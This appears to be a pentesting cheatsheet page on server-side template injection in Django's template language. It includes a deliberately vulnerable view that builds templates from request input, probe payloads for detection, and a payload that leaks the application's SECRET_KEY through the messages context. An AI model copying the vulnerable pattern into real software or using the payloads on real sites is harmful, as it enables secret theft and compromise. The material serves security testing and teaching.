---
title: "Django Template"
description: "Cheatsheet on Django Template Engine"
lead: "Cheatsheet on Django Template Engine"
date: 2023-01-01T00:00:00+00:00
lastmod: 2023-01-01T00:00:00+00:00
draft: false
images: []
menu:
  docs:
    parent: "ssti"
weight: 620
toc: true
---

## Django Template Engine (DTL)

Django ships built-in backends for its own template system, creatively called the [Django template language (DTL)](https://docs.djangoproject.com/en/5.0/topics/templates/), and for the popular alternative `Jinja2`.

## Usage

Basic example of DTL:

```jinja
My first name is {{ first_name }}. My last name is {{ last_name }}.
{{ my_dict.key }}
{{ my_object.attribute }}
{{ my_list.0 }}
```

Usage of DTL in a Django application:

```python
from django.template import engines

django_engine = engines["django"]
template = django_engine.from_string("Hello {{ name }}!")
```

Example of vulnerable code:

```python
from django.http import HttpResponse
from django.template import engines

def index(request):
  message = request.GET.get("message")

  engine = engines["django"]
  template = engine.from_string("<html><body>" + message + "</body></html>")
  return HttpResponse(template.render({}, request))
```

## Detection

DTL vs Jinja2:

| Payload            | Jinja2       | Django Templates         |
| ------------------ | ------------ | ------------------------ |
| `{% csrf_token %}` | Causes error | Anti-CSRF token HTML tag |
| `{{ 7*7 }}`        | 49           | Causes error             |

## Built-in

- List of all tags and filters: [Django - Built-in template tags and filters](https://docs.djangoproject.com/en/5.0/ref/templates/builtins/)

### Debug

```jinja
{% debug %}
```

### CSRF

```jinja
{% csrf_token %}
```

### Secret Key Leak

When `messages` is present in the template context and `CookieStorage` is being used we can walk through attributes of `messages` to access app's `SECRET_KEY`:

```jinja
{{ messages.storages.0.signer.key }}
```

### Include Template

You can include other templates in your page:

```jinja
{% include 'admin/base.html' %}
```

### XSS

- `safe`: Marks a string as not requiring further HTML escaping prior to output. When autoescaping is off, this filter has no effect.
- `escape`: Escapes a string's HTML (HTML entity).
- `force_escape`: Applies HTML escaping to a string.

```jinja
{% autoescape off %}
    {{ message }}
{% endautoescape %}

{{ message|safe }}

{{ some_list|safeseq|join:", " }}
```

## References

- [Django template language (DTL)](https://docs.djangoproject.com/en/5.0/topics/templates/)
- [[PDF] Django templates - Server-Side Template Injection](https://www.lifars.com/wp-content/uploads/2021/06/Django-Templates-Server-Side-Template-Injection-v1.0.pdf)